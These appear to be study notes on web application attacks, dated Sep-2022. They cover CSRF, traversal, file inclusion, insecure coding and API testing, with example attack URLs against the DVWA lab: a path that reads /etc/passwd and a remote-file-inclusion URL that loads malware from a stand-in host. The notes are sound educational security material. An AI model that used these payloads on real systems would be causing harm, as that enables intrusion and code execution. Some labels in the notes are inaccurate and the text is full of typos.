<h5><em>ver: Sep-2022</em></h5>

<h3>Server Side Attack</h3>

Refer to https://cheatsheetseries.owasp.org/Glossary.html

---

<h4>Cross Site Script (CSRF/XSRF)</h4>

-   CSRF = One-click attacks or session riding
-   Use server side trust to clients

```sh
# URL manipulation example on "DVWA"
http://xxx.xxd.xxd.xxx:port/vulnerabilities/csrf/?password_new=newpassword&password_conf=newpasword &Change=Change#

```

---

<h4>Clickjacking (UI redress attacks)</h4>

-   Use multiple transparent or opaque layers to induce a user into clicking on a web button or link
-   Combination of CSS stylesheets, iframes, and text boxes to fool ther user into entering information or clicking

---

<h4>Exploiting Security Misconfiguration</h4>

<h5><br/>Directory Traversal</h5>

-   Use dot-dot-slash(../) to go outside of the web root folder

```sh
# URL manipulation example on "DVWA"
http://xxx.xxd.xxd.xxx:port/vulnerabilities/?page=../../../../../etc/passwd

# URL encoding
%2e%2e%2f = %2e%2e/ = ..%2f = %2e%2e%5c

```

<h5><br/>Cookie Manipulation Attacks (Stored DOM-based Attackks)</h5>

-   Possible when vulerable applications store user input and then embed that input in a response within a part of the DOM
-   Attacker uses a JavaScript string (or other script) to trigger the DOM-based vulnerability to write controllable data in tho the value of a cookie

---

<h4>File Inclusion Vulnerabilities</h4>

<h5><br/>Local File Inclusion Vulnerabilities (LFI)</h5>

-   Occurs when a web application allows a user to submit input into files or upload files to the server
-   Attacker reads and execute the file on the victiom's system
-   Can be critical when the web application runs with high privilege such as root privilege

<h5><br/>Remote File Inclusion Vulnerabilities (RLFI)</h5>

-   Similar to LFI, however attacker can execute code hosted on his/her won system

```sh
# URL manipulation example on "DVWA". Host malicious script or malware
http://xxx.xxd.xxd.xxx:port/vulnerabilities/fi/?page=http://malicious.site.org/malware.html

```

---

<h4>Ensecure Code Practices</h4>

<h5><br/>Comments in Source Code</h5>

-   Too much information, such as details about a system password, API credeitials, or other sensitive information, could be leveraged by attackers
-   Refer to https://cwe.mitre.org/data/definitions/615.html

<h5><br/>Hard coded credentials</h5>

-   Attackers can completely compromise and application or the underlying system
-   Refer to https://cwe.mitre.org/data/definitions/798.html

<h5><br/>Race Conditions (Time of check to time of use: TOCTOU)</h5>

-   Race condition occures when a system or an application attemtps to perform two or more operations at the same time
-   The attack complexity is very high since there is a small window of time between when a security control takes effect and when the attacker is performed

---

<h4>Unprotected APIs</h4>

Refer to https://cwe.mitre.org/data/definitions/227.html

-   Simple Object Access Protocol (SOAP)

    -   XML and standard-based web services access protocol developed to replace Distributed Componet Object Model (DCOM) and Common Object Request Broker Architecture (CORBA)
    -   Refer to https://www.w3.org/TR/soap/

-   Representational State Transfer (REST)

    -   JSON based API that easier to use than SOAP
    -   Uses standards such as Swagger and OpenAPI Speicication (https://www.openapis.org/)

-   GraphQL

    -   A query language for APIs that provide many developer tools
    -   Refer to https://graphql.org/code/

-   Swagger (OpenAPI)

    -   Modern framework of API documentation and development that is the basis of the OpenAPI Specification (OAS)
    -   Refer to https://swagger.io/ and https://github.com/OAI/OpenAPI-Specification

-   Web Services Description Language (WSDL)

    -   XML-based language that is used to document the fucntionality of a web service
    -   Refer to https://www.w3.org/TR/2007/REC-wsdl20-primer-20070626/

-   Web Application Description Language (WADL)

    -   XML-based language for describing web applications
    -   Refer to https://www.w3.org/Submission/wadl/

<h6>API testing: Option-1</h6>
1. Collect full requests by using a proxy such as Burp Suite or OWASP ZAP since REST, SOAP, and other API services use more than GET parameters
2. Look for nonstandard parameters and for abnormal HTTP headers
3. When analysizes, determine whether a URL segment has a repeating pattern across other URLs (can include nomber or an ID, dates, and other valuable information)
4. Inspect the results and look for structured parameter values in JSON, XML, or even nonstandard structures

<h6>API testing: Option-2</h6>

1. Use fuzzing (https://owasp.org/www-community/Fuzzing)

---

<h4>Hidden Elements</h4>

-   It is possible to tamper with the parameter values stored by a web application in hiddden form fields

```html
<input type="hidden" id="123" name="price" value="100.00" />
```

---

<h4>Lack of Code Signing</h4>

-   Code signing (image signing) involves adding a digital signature to software and applications to verify taht the application, operating system, or any software has not been modified since it was signed
-   Similar to the process used for SSL/TLS
-   Subresource Integrity (SRI): A security feature that allows you to provide a hash of a file fetch by a web browser and verifies file integrity

---

<h4>Additional Web Application Hacking Tools</h4>

-   Many ethical and malicious hackers use web proxies to exploit vulnerabilities in web applicaitons
-   Web proxy: Typically installed in the attacker's system to intercept, modify, or delete transactions

<h6>Burp Suite</h6>

-   Refer to https://portswigger.net/burp

<h6>OWASP ZAP</h6>

-   A collection of tools including proxy, automated scanning, fuzzing, and other capabilities that can be used to find vulnerabilities in web applications
    -   gobuster: Similar to DirBuster that perform active reconnaissance of a web application (https://github.com/OJ/gobuster)
    -   ffuf: Very fast web fuzzer (https://github.com/ffuf/ffuf)
    -   foroxbuster: A reconnaissance fuzzer (https://github.com/epi052/feroxbuster)
-   Refer to https://www.zaproxy.org/

---
